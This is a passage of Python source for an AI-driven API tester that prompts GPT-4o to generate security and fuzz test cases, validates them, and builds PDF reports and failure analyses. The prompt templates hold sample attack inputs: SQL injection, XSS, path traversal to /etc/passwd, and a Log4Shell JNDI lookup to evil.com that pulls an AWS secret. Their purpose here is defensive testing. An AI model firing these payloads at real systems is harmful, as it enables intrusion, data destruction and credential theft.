{auth_note}

SAMPLE DATA STRUCTURE:
{json.dumps(sample_data, indent=2)}

TEST CATEGORIES REQUIRED: {', '.join(test_types)}

CRITICAL REQUIREMENTS:
1. Generate EXACTLY {num_tests} test cases - no more, no less
2. Each test must be PRODUCTION-READY and catch real vulnerabilities
3. Prioritize SECURITY TESTING - think like a penetration tester
4. Use REAL-WORLD attack vectors from your 30+ years of experience
5. Each test description must be CLEAR and PROFESSIONAL

OUTPUT FORMAT (JSON):
{{
  "tests": [
    {{"method": "POST", "endpoint": "", "data": {{"name": "test"}}, "params": null, "expected_status": 201, "description": "Create valid resource with complete payload", "category": "happy_path", "validate_body": false}},
    {{"method": "POST", "endpoint": "", "data": {{"field": "'; DROP TABLE users; --"}}, "params": null, "expected_status": 400, "description": "SQL injection attack - DROP TABLE statement", "category": "security_test", "validate_body": false}},
    {{"method": "POST", "endpoint": "", "data": {{"field": "<script>alert('XSS')</script>"}}, "params": null, "expected_status": 400, "description": "XSS attack - malicious script injection", "category": "security_test", "validate_body": false}},
    {{"method": "POST", "endpoint": "", "data": {{"field": "A" * 100000}}, "params": null, "expected_status": 413, "description": "Fuzz: Extremely large payload (100k chars)", "category": "fuzz_test", "validate_body": false}},
    {{"method": "POST", "endpoint": "", "data": {{"field": 2147483647}}, "params": null, "expected_status": 400, "description": "Fuzz: Integer overflow (INT_MAX)", "category": "fuzz_test", "validate_body": false}},
    {{"method": "GET", "endpoint": "/../../../etc/passwd", "data": null, "params": null, "expected_status": 403, "description": "Path traversal attack - attempt to access system files", "category": "security_test", "validate_body": false}},
    ... continue to EXACTLY {num_tests} tests
  ]
}}

TEST DISTRIBUTION GUIDELINES:
- Happy Path Tests: ~20% (valid operations, CRUD operations, successful workflows)
- Security Tests: ~25% (SQL injection, XSS, XXE, SSRF, path traversal, command injection, authentication bypass, IDOR, CSRF, SSTI)
- Negative Tests: ~20% (invalid inputs, missing required fields, malformed requests, unauthorized access, invalid methods)
- Edge Cases: ~15% (boundary values, null/empty inputs, extremely large payloads, special characters, unicode, float edge cases)
- Fuzz Tests: ~20% (random/malformed data, type confusion, integer overflow/underflow, buffer overflows, format strings, encoding attacks)

SECURITY FOCUS AREAS:
- OWASP Top 10 vulnerabilities
- API-specific attacks (mass assignment, excessive data exposure, broken authentication, broken object level authorization)
- Input validation bypasses
- Business logic flaws
- Rate limiting and DoS vectors

FUZZ TESTING FOCUS (CRITICAL - 20% of tests):
Expert fuzzing techniques you MUST include:
- Integer overflows: INT_MAX (2147483647), INT_MIN (-2147483648), LONG_MAX (9223372036854775807)
- Buffer overflows: Extremely large strings (100k+ chars), 1MB payloads
- Type confusion: Arrays instead of strings, objects instead of primitives, booleans instead of numbers
- Null byte injection: \\x00 in strings, path traversal with null bytes
- Format string attacks: %s%s%s%s%s, %n, %x patterns
- Unicode attacks: Invalid unicode (\\uD800, \\uFFFF), zero-width characters, RTL override
- Control characters: \\r\\n (CRLF), \\x00-\\x1F range
- Deeply nested structures: 10+ levels of nested objects/arrays
- Special numeric values: Infinity, -Infinity, NaN, extremely small floats
- Encoding attacks: Double URL encoding, UTF-7, null byte tricks
- Polyglot payloads: Multi-context XSS, JSON+SQL injection combos
- Log4Shell style: ${{jndi:ldap://evil.com/a}}, ${{env:AWS_SECRET_KEY}}
- Deserialization attacks: Malicious serialized objects

Remember: You're a 30+ year QA veteran - make these tests BULLETPROOF and PROFESSIONAL.
Return EXACTLY {num_tests} test cases in valid JSON format."""
        
        max_retries = 3

        # Check if OpenAI client is initialized
        if self.client is None:
            print("❌ OpenAI client not initialized. Cannot generate AI test cases.")
            update_status("OpenAI client not available. Using fallback...")
            return self._generate_fallback_tests(api_url, sample_data, num_tests, has_auth), True

        for attempt in range(max_retries):
            try:
                if attempt > 0:
                    update_status(f"Retry attempt {attempt + 1}/{max_retries}...")
                    wait_time = 2 ** attempt
                    time.sleep(wait_time)
                else:
                    update_status("Generating Test Cases ...")

                # Call OpenAI API with GPT-4o for highest quality test generation
                print(f"🔄 Calling OpenAI API (Attempt {attempt + 1}/{max_retries})...")
                print(f"   Model: {self.model}")
                print(f"   Temperature: {self.temperature}")
                print(f"   Max Tokens: {self.max_tokens}")

                response = self.client.chat.completions.create(
                    model=self.model,
                    messages=[
                        {
                            "role": "system",
                            "content": """You are a SENIOR QA ARCHITECT with 30+ years of experience in API testing, security testing, fuzz testing, and quality assurance.

You have worked with Fortune 500 companies and have deep expertise in:
- OWASP Top 10 security vulnerabilities (SQL injection, XSS, CSRF, SSRF, etc.)
- Advanced FUZZ TESTING techniques (AFL, libFuzzer, mutation-based fuzzing, coverage-guided fuzzing)
- API testing methodologies (REST, GraphQL, SOAP)
- Boundary value analysis and equivalence partitioning
- Security testing and penetration testing
- Integer overflow/underflow attacks and buffer overflow detection
- Format string vulnerabilities and memory corruption bugs
- Type confusion and deserialization attacks
- Performance and load testing considerations
- Industry best practices and compliance standards (PCI-DSS, HIPAA, GDPR)

Generate EXPERT-LEVEL, production-ready API test cases that would catch critical bugs before they reach production.
Your test cases should be:
1. COMPREHENSIVE - Cover all attack vectors, edge cases, and fuzzing scenarios
2. REALISTIC - Based on real-world scenarios and actual vulnerabilities (CVEs, bug bounty reports)
3. PRECISE - Each test has a clear purpose and expected outcome
4. SECURITY-FOCUSED - Prioritize security testing and fuzzing alongside functional testing
5. PROFESSIONAL - Follow industry standards and best practices
6. FUZZ-AWARE - Include random/malformed inputs that trigger crashes, hangs, or undefined behavior

FUZZ TESTING is CRITICAL - Include comprehensive fuzzing that would find:
- Memory corruption bugs (buffer overflows, use-after-free)
- Integer handling bugs (overflow, underflow, signedness issues)
- Input validation failures (null bytes, control characters, encoding issues)
- Logic errors triggered by unexpected input combinations

Return ONLY valid JSON format. Be meticulous and thorough like a senior QA lead reviewing a critical production API."""
                        },
                        {
                            "role": "user",
                            "content": prompt
                        }
                    ],
                    temperature=self.temperature,
                    max_tokens=self.max_tokens,
                    response_format={"type": "json_object"}
                )

                print(f"✅ OpenAI API call successful!")
                print(f"   Response received, processing...")

                # Extract response from OpenAI format
                response_text = response.choices[0].message.content

                print(f"\n📄 Raw Response (first 500 chars):")
                print(f"   {response_text[:500]}...")
                print(f"   Total length: {len(response_text)} characters\n")

                if not response_text or len(response_text.strip()) == 0:
                    print(f"❌ Empty response from OpenAI")
                    update_status(f"Attempt {attempt + 1}: Empty AI response")
                    if attempt == max_retries - 1:
                        update_status("AI failed. Using fallback generation...")
                        fallback = self._generate_fallback_tests(api_url, sample_data, num_tests, has_auth)
                        return fallback, True
                    continue

                update_status("Parsing AI response...")
                response_text = response_text.strip()
                cleaned_text = self._clean_json_response(response_text)

                print(f"🧹 Cleaned JSON (first 500 chars):")
                print(f"   {cleaned_text[:500]}...")

                if not cleaned_text:
                    print(f"❌ Could not extract JSON from response")
                    update_status(f"Attempt {attempt + 1}: Could not extract JSON")
                    continue

                try:
                    parsed_response = json.loads(cleaned_text)
                    print(f"✅ JSON parsed successfully!")
                    print(f"   Type: {type(parsed_response)}")
                    if isinstance(parsed_response, dict):
                        print(f"   Keys: {list(parsed_response.keys())}")

                    # Extract tests array from the response object
                    if isinstance(parsed_response, dict) and 'tests' in parsed_response:
                        test_cases = parsed_response['tests']
                        print(f"✅ Found 'tests' array with {len(test_cases)} items")
                    elif isinstance(parsed_response, list):
                        # Fallback: if response is already an array, use it directly
                        test_cases = parsed_response
                        print(f"✅ Response is already an array with {len(test_cases)} items")
                    else:
                        print(f"❌ Response does not contain 'tests' array. Keys: {list(parsed_response.keys()) if isinstance(parsed_response, dict) else 'N/A'}")
                        raise ValueError("Response does not contain 'tests' array")
                except (json.JSONDecodeError, ValueError) as e:
                    print(f"❌ JSON parsing error: {str(e)}")
                    update_status(f"Attempt {attempt + 1}: JSON parse error - {str(e)}")
                    if attempt < max_retries - 1:
                        continue
                    else:
                        update_status("All parsing failed. Using fallback...")
                        return self._generate_fallback_tests(api_url, sample_data, num_tests, has_auth), True

                if not isinstance(test_cases, list):
                    print(f"❌ test_cases is not a list, it's: {type(test_cases)}")
                    update_status(f"Attempt {attempt + 1}: Response not a list")
                    if attempt < max_retries - 1:
                        continue
                    else:
                        return self._generate_fallback_tests(api_url, sample_data, num_tests, has_auth), True

                print(f"🔍 Validating {len(test_cases)} test cases...")
                update_status("Validating test cases...")
                valid_cases = []
                for i, tc in enumerate(test_cases):
                    if isinstance(tc, dict):
                        try:
                            fixed_tc = self._validate_and_fix_test_case(tc)
                            valid_cases.append(fixed_tc)
                        except Exception as e:
                            print(f"   ⚠️  Test case {i+1} validation failed: {str(e)}")
                            continue
                    else:
                        print(f"   ⚠️  Test case {i+1} is not a dict: {type(tc)}")

                print(f"✅ Validated {len(valid_cases)} out of {len(test_cases)} test cases")

                # Accept if we get at least 80% of requested tests (was too strict at 90%)
                min_acceptable = max(1, int(num_tests * 0.8))

                print(f"📊 Validation Results:")
                print(f"   Requested: {num_tests}")
                print(f"   Minimum acceptable (80%): {min_acceptable}")
                print(f"   Valid cases received: {len(valid_cases)}")

                if len(valid_cases) >= num_tests:
                    # Perfect! Got exactly what we need or more
                    print(f"🎉 SUCCESS! Got {len(valid_cases)} valid test cases (≥{num_tests} requested)")
                    update_status(f"Successfully generated {len(valid_cases)} expert-level test cases!")
                    return valid_cases[:num_tests], False  # Pure AI generation
                elif len(valid_cases) >= min_acceptable:
                    # Close enough (80%+) - accept it as pure AI
                    print(f"🎉 SUCCESS! Got {len(valid_cases)} valid test cases (≥{min_acceptable} minimum, 80%)")
                    update_status(f"Successfully generated {len(valid_cases)} expert-level test cases!")
                    return valid_cases, False  # Pure AI generation
                else:
                    # Not enough tests - retry or use fallback
                    print(f"⚠️  Only {len(valid_cases)} valid cases (need {min_acceptable})")
                    if attempt < max_retries - 1:
                        print(f"🔄 Retrying... ({max_retries - attempt - 1} attempts remaining)")
                        update_status(f"Only {len(valid_cases)} valid (need {min_acceptable}), retrying AI generation...")
                        continue
                    else:
                        # All retries exhausted - use pure fallback
                        print(f"❌ All {max_retries} attempts exhausted. Using fallback.")
                        update_status(f"AI generation incomplete after {max_retries} attempts. Using pure fallback...")
                        return self._generate_fallback_tests(api_url, sample_data, num_tests, has_auth), True
                    
            except Exception as e:
                error_msg = f"Attempt {attempt + 1}: Error - {str(e)}"
                update_status(error_msg)
                # Print detailed error to terminal for debugging
                print(f"\n❌ OpenAI API Error (Attempt {attempt + 1}/{max_retries}):")
                print(f"   Error Type: {type(e).__name__}")
                print(f"   Error Message: {str(e)}")
                import traceback
                print(f"   Traceback: {traceback.format_exc()}")

                if attempt == max_retries - 1:
                    update_status("All attempts failed. Using fallback...")
                    print(f"\n🔴 All {max_retries} AI generation attempts failed. Switching to fallback.\n")
                    return self._generate_fallback_tests(api_url, sample_data, num_tests, has_auth), True
                continue
        
        # Final fallback
        update_status("Using fallback generation...")
        return self._generate_fallback_tests(api_url, sample_data, num_tests, has_auth), True

    def _generate_test_cases_batched(self, api_url: str, sample_data: Dict, num_tests: int,
                                     test_types: List[str], has_auth: bool,
                                     status_container=None) -> tuple:
        """Generate large numbers of test cases using batching to avoid token limits.

        Splits the request into batches of 40 tests each for reliable generation.
        """
        def update_status(message):
            if status_container:
                status_container.update(label=message)

        all_tests = []
        used_fallback = False
        batch_size = 40  # Optimal batch size for GPT-4o
        total_batches = (num_tests + batch_size - 1) // batch_size

        print(f"\n🚀 Batched generation requested: {num_tests} tests in {total_batches} batches\n")
        update_status(f"Generating {num_tests} tests in {total_batches} batches...")

        # Distribute test types across batches
        tests_per_batch = []
        remaining = num_tests
        for i in range(total_batches):
            batch_count = min(batch_size, remaining)
            tests_per_batch.append(batch_count)
            remaining -= batch_count

        for batch_idx in range(total_batches):
            batch_num = batch_idx + 1
            batch_test_count = tests_per_batch[batch_idx]

            print(f"\n📦 Batch {batch_num}/{total_batches}: Generating {batch_test_count} tests...")
            update_status(f"Batch {batch_num}/{total_batches}: Generating {batch_test_count} tests...")

            # Generate this batch (recursive call with smaller num_tests)
            # Use the original method for single batch (num_tests <= 50)
            batch_tests, batch_fallback = self._generate_single_batch(
                api_url, sample_data, batch_test_count, test_types, has_auth, batch_num, total_batches
            )

            if batch_fallback:
                used_fallback = True

            all_tests.extend(batch_tests)
            print(f"   ✅ Batch {batch_num} complete: {len(batch_tests)} tests (Total so far: {len(all_tests)})")

            # Small delay between batches to avoid rate limiting
            if batch_idx < total_batches - 1:
                time.sleep(1)

        # If we still don't have enough tests, supplement with fallback
        if len(all_tests) < num_tests:
            shortfall = num_tests - len(all_tests)
            print(f"\n⚠️ Shortfall of {shortfall} tests, supplementing with fallback...")
            update_status(f"Supplementing with {shortfall} additional tests...")
            extra_tests = self._generate_fallback_tests(api_url, sample_data, shortfall, has_auth)
            all_tests.extend(extra_tests)
            used_fallback = True

        final_tests = all_tests[:num_tests]
        print(f"\n🎉 Batched generation complete: {len(final_tests)} tests generated")
        update_status(f"Successfully generated {len(final_tests)} test cases!")

        return final_tests, used_fallback

    def _generate_single_batch(self, api_url: str, sample_data: Dict, num_tests: int,
                               test_types: List[str], has_auth: bool,
                               batch_num: int, total_batches: int) -> tuple:
        """Generate a single batch of tests. Similar to generate_test_cases but simpler."""

        if self.client is None:
            return self._generate_fallback_tests(api_url, sample_data, num_tests, has_auth), True

        auth_note = "Note: API requires authentication." if has_auth else ""

        # Simpler prompt for batched generation
        prompt = f"""Generate EXACTLY {num_tests} API test cases for batch {batch_num}/{total_batches}.

API: {api_url}
{auth_note}

Sample data: {json.dumps(sample_data, indent=2)}

Categories: {', '.join(test_types)}

Return JSON: {{"tests": [{{"method": "...", "endpoint": "...", "data": ..., "params": ..., "expected_status": ..., "description": "...", "category": "...", "validate_body": false}}, ...]}}

Generate EXACTLY {num_tests} diverse, production-ready tests."""

        try:
            response = self.client.chat.completions.create(
                model=self.model,
                messages=[
                    {"role": "system", "content": "You are a senior QA engineer. Generate exact number of API test cases requested."},
                    {"role": "user", "content": prompt}
                ],
                temperature=self.temperature,
                max_tokens=self.max_tokens,
                response_format={"type": "json_object"}
            )

            response_text = response.choices[0].message.content.strip()
            cleaned_text = self._clean_json_response(response_text)
            parsed = json.loads(cleaned_text)

            if isinstance(parsed, dict) and 'tests' in parsed:
                test_cases = parsed['tests']
            elif isinstance(parsed, list):
                test_cases = parsed
            else:
                return self._generate_fallback_tests(api_url, sample_data, num_tests, has_auth), True

            valid_cases = []
            for tc in test_cases:
                if isinstance(tc, dict):
                    try:
                        valid_cases.append(self._validate_and_fix_test_case(tc))
                    except:
                        pass

            if len(valid_cases) >= num_tests * 0.7:  # Accept 70%+ for batches
                return valid_cases, False
            else:
                # Supplement with fallback
                shortfall = num_tests - len(valid_cases)
                extra = self._generate_fallback_tests(api_url, sample_data, shortfall, has_auth)
                return valid_cases + extra, True

        except Exception as e:
            print(f"   ❌ Batch generation error: {str(e)}")
            return self._generate_fallback_tests(api_url, sample_data, num_tests, has_auth), True


def generate_pdf_report(tester: APITester, api_url: str, auth_enabled: bool = False):
    """Generate comprehensive PDF report from test results"""
    try:
        buffer = io.BytesIO()
        doc = SimpleDocTemplate(
            buffer, 
            pagesize=letter, 
            rightMargin=50, 
            leftMargin=50,
            topMargin=50, 
            bottomMargin=30
        )
        
        story = []
        styles = getSampleStyleSheet()
        
        # Custom styles
        title_style = ParagraphStyle(
            'CustomTitle',
            parent=styles['Heading1'],
            fontSize=20,
            textColor=colors.HexColor('#1f77b4'),
            spaceAfter=20,
            alignment=TA_CENTER,
            fontName='Helvetica-Bold'
        )
        
        heading_style = ParagraphStyle(
            'CustomHeading',
            parent=styles['Heading2'],
            fontSize=14,
            textColor=colors.HexColor('#2c3e50'),
            spaceAfter=12,
            spaceBefore=12,
            fontName='Helvetica-Bold'
        )
        
        normal_style = ParagraphStyle(
            'CustomNormal',
            parent=styles['Normal'],
            fontSize=9,
            leading=12
        )
        
        # Title
        story.append(Paragraph("API Test Report (AI-Generated)", title_style))
        story.append(Spacer(1, 12))
        
        # API Information
        api_info = f"""
        <b>API Endpoint:</b> {api_url}<br/>
        <b>Test Date:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}<br/>
        <b>Authentication:</b> {'Enabled' if auth_enabled else 'Disabled'}
        """
        story.append(Paragraph(api_info, normal_style))
        story.append(Spacer(1, 20))
        
        # Test Summary
        story.append(Paragraph("Test Summary", heading_style))
        
        summary = tester.get_summary()
        summary_data = [
            ['Metric', 'Value'],
            ['Total Tests', str(summary['total'])],
            ['Passed', str(summary['passed'])],
            ['Failed', str(summary['failed'])],
            ['Pass Rate', f"{summary['pass_rate']:.1f}%"]
        ]
        
        summary_table = Table(summary_data, colWidths=[3*inch, 2*inch])
        summary_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#3498db')),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
            ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, 0), 11),
            ('BOTTOMPADDING', (0, 0), (-1, 0), 10),
            ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
            ('GRID', (0, 0), (-1, -1), 1, colors.black),
            ('FONTSIZE', (0, 1), (-1, -1), 10),
        ]))
        
        story.append(summary_table)
        story.append(Spacer(1, 20))
        
        # Detailed Test Results
        story.append(Paragraph("Detailed Test Results", heading_style))
        story.append(Spacer(1, 10))
        
        # Create detailed results table
        results_data = [['Test', 'Status', 'Details']]
        
        for result in tester.results:
            # Determine status color
            if result['status'] == 'PASS':
                status_color = colors.green
                status_text = 'PASS'
            else:
                status_color = colors.red
                status_text = 'FAIL'
            
            # Truncate test name and details for better fit
            test_name = result['test']
            if len(test_name) > 50:
                test_name = test_name[:47] + "..."
            
            details = result['details']
            if len(details) > 100:
                details = details[:97] + "..."
            
            # Create paragraphs for each cell
            test_para = Paragraph(test_name, ParagraphStyle(
                'TestName',
                parent=normal_style,
                fontSize=8,
                leading=10
            ))
            
            status_para = Paragraph(
                f"<font color='{status_color.hexval()}'><b>{status_text}</b></font>",
                ParagraphStyle(
                    'Status',
                    parent=normal_style,
                    fontSize=8,
                    alignment=TA_CENTER
                )
            )
            
            details_para = Paragraph(details, ParagraphStyle(
                'Details',
                parent=normal_style,
                fontSize=8,
                leading=10
            ))
            
            results_data.append([test_para, status_para, details_para])
        
        # Create results table with better column widths
        results_table = Table(results_data, colWidths=[2.8*inch, 0.7*inch, 3*inch])
        results_table.setStyle(TableStyle([
            # Header style
            ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#3498db')),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
            ('ALIGN', (0, 0), (-1, 0), 'LEFT'),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, 0), 10),
            ('BOTTOMPADDING', (0, 0), (-1, 0), 10),
            ('TOPPADDING', (0, 0), (-1, 0), 10),
            
            # Body style
            ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
            ('ALIGN', (0, 1), (0, -1), 'LEFT'),
            ('ALIGN', (1, 1), (1, -1), 'CENTER'),
            ('ALIGN', (2, 1), (2, -1), 'LEFT'),
            ('VALIGN', (0, 0), (-1, -1), 'TOP'),
            ('FONTSIZE', (0, 1), (-1, -1), 8),
            ('TOPPADDING', (0, 1), (-1, -1), 6),
            ('BOTTOMPADDING', (0, 1), (-1, -1), 6),
            ('LEFTPADDING', (0, 1), (-1, -1), 6),
            ('RIGHTPADDING', (0, 1), (-1, -1), 6),
            
            # Grid
            ('GRID', (0, 0), (-1, -1), 0.5, colors.grey),
            ('LINEBELOW', (0, 0), (-1, 0), 1.5, colors.HexColor('#2c3e50')),
        ]))
        
        story.append(results_table)
        
        # Category breakdown
        story.append(Spacer(1, 20))
        story.append(Paragraph("Test Category Breakdown", heading_style))
        
        # Count tests by category
        categories = {}
        for result in tester.results:
            # Extract category from test name
            if '[AI Test' in result['test'] or '[Custom Test' in result['test']:
                # Try to determine category from test content
                test_lower = result['test'].lower()
                if 'happy' in test_lower or 'valid' in test_lower or 'create' in test_lower or 'retrieve' in test_lower:
                    cat = 'happy_path'
                elif 'negative' in test_lower or 'missing' in test_lower or 'invalid' in test_lower:
                    cat = 'negative_test'
                elif 'security' in test_lower or 'sql' in test_lower or 'xss' in test_lower:
                    cat = 'security_test'
                elif 'edge' in test_lower or 'boundary' in test_lower:
                    cat = 'edge_case'
                else:
                    cat = 'other'
            else:
                cat = 'other'
            
            if cat not in categories:
                categories[cat] = {'total': 0, 'passed': 0, 'failed': 0}
            
            categories[cat]['total'] += 1
            if result['status'] == 'PASS':
                categories[cat]['passed'] += 1
            else:
                categories[cat]['failed'] += 1
        
        # Create category table
        category_data = [['Category', 'Total', 'Passed', 'Failed', 'Pass Rate']]
        
        category_names = {
            'happy_path': 'Happy Path Tests',
            'negative_test': 'Negative Tests',
            'security_test': 'Security Tests',
            'edge_case': 'Edge Cases',
            'other': 'Other Tests'
        }
        
        for cat, stats in categories.items():
            pass_rate = (stats['passed'] / stats['total'] * 100) if stats['total'] > 0 else 0
            category_data.append([
                category_names.get(cat, cat),
                str(stats['total']),
                str(stats['passed']),
                str(stats['failed']),
                f"{pass_rate:.1f}%"
            ])
        
        category_table = Table(category_data, colWidths=[2*inch, 1*inch, 1*inch, 1*inch, 1.5*inch])
        category_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#3498db')),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, 0), 10),
            ('BOTTOMPADDING', (0, 0), (-1, 0), 10),
            ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
            ('GRID', (0, 0), (-1, -1), 1, colors.black),
            ('FONTSIZE', (0, 1), (-1, -1), 9),
        ]))
        
        story.append(category_table)
        
        # Footer
        story.append(Spacer(1, 30))
        footer_text = f"""
        <para align=center>
        <font size=8 color='gray'>
        Generated by AI-Powered API Tester V7<br/>
        Report created: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}<br/>
        Total test execution time: {len(tester.results)} tests completed
        </font>
        </para>
        """
        story.append(Paragraph(footer_text, styles['Normal']))
        
        # Build PDF
        doc.build(story)
        buffer.seek(0)
        return buffer
    
    except Exception as e:
        st.error(f"Error generating PDF report: {str(e)}")
        import traceback
        st.code(traceback.format_exc())
        return None


class AIRootCauseAnalyzer:
    """
    Production-ready AI-powered root cause analyzer for test failures.
    Provides CTO-level technical analysis with actionable recommendations.

    Features:
    - Intelligent failure pattern recognition
    - Multi-test correlation analysis
    - Severity assessment and risk scoring
    - Actionable remediation recommendations
    - Historical learning capabilities
    """

    def __init__(self, api_key: str = None):
        """Initialize the AI Root Cause Analyzer with OpenAI GPT-4"""
        api_key = api_key or os.getenv("OPENAI_API_KEY", "").strip()

        if not api_key or api_key == "dummy_key":
            print("⚠️ Warning: AI Root Cause Analysis unavailable - No valid OpenAI API key")
            self.client = None
        else:
            try:
                self.client = OpenAI(api_key=api_key)
                print("✅ AI Root Cause Analyzer initialized successfully")
            except Exception as e:
                print(f"❌ Failed to initialize AI analyzer: {str(e)}")
                self.client = None

        # GPT-4o for expert-level analysis
        self.model = "gpt-4o"
        # Low temperature for consistent, professional analysis
        self.temperature = 0.2
        self.max_tokens = 2000

        # Critical failure patterns that trigger auto-analysis (Hybrid Option 3)
        self.critical_patterns = [
            'authentication', 'security', '500', '503', 'timeout',
            'crash', 'error', 'failed', 'unauthorized', '401', '403'
        ]

    def is_critical_failure(self, failure_context: Dict) -> bool:
        """
        Determines if a failure is critical and should trigger automatic analysis.
        Part of Hybrid Option 3 implementation.
        """
        if not failure_context:
            return False

        # Check status code
        actual_status = failure_context.get('actual_status', 0)
        if actual_status in [500, 503, 401, 403]:
            return True

        # Check error message for critical patterns
        error_message = str(failure_context.get('error_message', '')).lower()
        for pattern in self.critical_patterns:
            if pattern in error_message:
                return True

        # Check test type - security and fuzz tests are always critical
        test_type = failure_context.get('test_type', '').lower()
        if test_type in ['security', 'fuzz', 'smoke']:
            return True

        return False

    def analyze_failure(self, failure_context: Dict) -> Dict:
        """
        Analyzes a single test failure with CTO-level professional insights.

        Args:
            failure_context: Dictionary containing:
                - test_name (str): Name of the test
                - test_type (str): Type of test (functional, smoke, performance, etc.)
                - endpoint (str): API endpoint tested
                - method (str): HTTP method
                - expected_status (int): Expected HTTP status code
                - actual_status (int): Actual HTTP status code received
                - expected_response (dict): Expected response data
                - actual_response (dict): Actual response data received
                - error_message (str): Error message if any
                - request_data (dict): Request payload sent
                - headers (dict): Request headers
                - response_time (float): Response time in milliseconds
                - previous_results (list, optional): Historical test results

        Returns:
            Dictionary containing:
                - root_cause (str): Professional explanation of the failure
                - severity (str): critical|high|medium|low
                - category (str): Failure category
                - recommendations (list): Actionable fix recommendations
                - technical_details (str): Deep technical analysis
                - business_impact (str): Business impact assessment
                - confidence_score (float): Analysis confidence (0.0-1.0)
                - next_steps (list): Immediate action items
        """
        if not self.client:
            return self._get_fallback_analysis()

        try:
            prompt = self._build_analysis_prompt(failure_context)

            response = self.client.chat.completions.create(
                model=self.model,
                temperature=self.temperature,
                max_tokens=self.max_tokens,
                messages=[
                    {
                        "role": "system",
                        "content": self._get_system_prompt()
                    },
                    {
                        "role": "user",
                        "content": prompt
                    }
                ],
                response_format={"type": "json_object"}
            )

            analysis = json.loads(response.choices[0].message.content)
            return self._validate_and_enhance_analysis(analysis, failure_context)

        except json.JSONDecodeError as e:
            print(f"⚠️ AI response parsing error: {str(e)}")
            return self._get_fallback_analysis()
        except Exception as e:
            print(f"❌ AI analysis failed: {str(e)}")
            return self._get_fallback_analysis()

    def analyze_batch_failures(self, failures: List[Dict]) -> Dict:
        """
        Analyzes multiple failures together to identify patterns and correlations.
        Critical for smoke testing where multiple endpoints may fail due to common cause.

        Args:
            failures: List of failure context dictionaries

        Returns:
            Pattern analysis with prioritized fix recommendations
        """
        if not self.client or not failures:
            return {
                'pattern': 'Analysis unavailable',
                'common_cause': 'Unable to determine',
                'fix_priority': [],
                'relationships': 'N/A'
            }

        try:
            prompt = self._build_batch_analysis_prompt(failures)

            response = self.client.chat.completions.create(
                model=self.model,
                temperature=self.temperature,
                max_tokens=2500,
                messages=[
                    {
                        "role": "system",
                        "content": """You are a Principal Engineer analyzing system-wide test failures.
                        Identify patterns, correlations, and root causes across multiple failures.
                        Provide strategic insights and prioritized remediation plans."""
                    },
                    {
                        "role": "user",
                        "content": prompt
                    }
                ],
                response_format={"type": "json_object"}
            )

            analysis = json.loads(response.choices[0].message.content)
            analysis['analyzed_at'] = datetime.now().isoformat()
            analysis['failure_count'] = len(failures)
            return analysis

        except Exception as e:
            print(f"❌ Batch analysis failed: {str(e)}")
            return {
                'pattern': 'Analysis failed',
                'common_cause': str(e),
                'fix_priority': [],
                'relationships': 'Error during analysis'
            }

    def _get_system_prompt(self) -> str:
        """Returns the CTO-level system prompt for professional analysis"""
        return """You are a seasoned Chief Technology Officer and Principal Engineer with 20+ years of experience in:
- Distributed systems architecture
- API design and testing
- Production incident response
- Performance optimization
- Security engineering
- DevOps and SRE practices

Your role is to analyze test failures with the same rigor and professionalism you would bring to a production incident.

Analysis Guidelines:
1. Be direct, technical, and actionable - no fluff
2. Identify root causes, not just symptoms
3. Assess business impact and urgency
4. Provide specific, implementable recommendations
5. Consider security, performance, and reliability implications
6. Think like you're explaining to the engineering team during an incident review

Communication Style:
- Professional but approachable (like a CTO in a war room)
- Technical precision without unnecessary jargon
- Clear priority signals (what to fix first and why)
- Confidence based on evidence, not speculation

Return analysis as JSON with complete technical details."""

    def _build_analysis_prompt(self, context: Dict) -> str:
        """Builds a comprehensive analysis prompt based on test type and failure context"""

        test_type = context.get('test_type', 'functional').lower()
        test_name = context.get('test_name', 'Unknown Test')
        endpoint = context.get('endpoint', 'N/A')
        method = context.get('method', 'GET')
        expected_status = context.get('expected_status', 'N/A')
        actual_status = context.get('actual_status', 'N/A')
        response_time = context.get('response_time', 'N/A')
        error_message = context.get('error_message', 'No error message')

        # Build base prompt
        prompt = f"""
CRITICAL TEST FAILURE - REQUIRES ROOT CAUSE ANALYSIS

Test Information:
==================
Test Type: {test_type.upper()}
Test Name: {test_name}
Endpoint: {method} {endpoint}
Expected Status: {expected_status}
Actual Status: {actual_status}
Response Time: {response_time}ms
Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}

Failure Details:
===============
Error Message: {error_message}

Request Payload:
{json.dumps(context.get('request_data', {}), indent=2)}

Expected Response:
{json.dumps(context.get('expected_response', {}), indent=2)}

Actual Response:
{json.dumps(context.get('actual_response', {}), indent=2)}

Request Headers:
{json.dumps(context.get('headers', {}), indent=2)}
"""

        # Add test-type-specific context
        if test_type == 'performance':
            prompt += f"""
Performance Context:
===================
Expected P95 Latency: {context.get('expected_p95', 'N/A')}ms
Actual P95 Latency: {context.get('actual_p95', 'N/A')}ms
Concurrent Users: {context.get('concurrent_users', 'N/A')}
Requests Per Second: {context.get('rps', 'N/A')}
Failure Rate: {context.get('failure_rate', 'N/A')}%
Memory Usage: {context.get('memory_usage', 'N/A')}
CPU Usage: {context.get('cpu_usage', 'N/A')}

FOCUS: Identify performance bottlenecks, scalability issues, resource constraints.
"""

        elif test_type in ['security', 'fuzz']:
            prompt += f"""
Security Context:
================
Attack Vector: {context.get('attack_vector', 'N/A')}
Payload Type: {context.get('payload_type', 'N/A')}
Vulnerability Suspected: {context.get('vulnerability_type', 'N/A')}
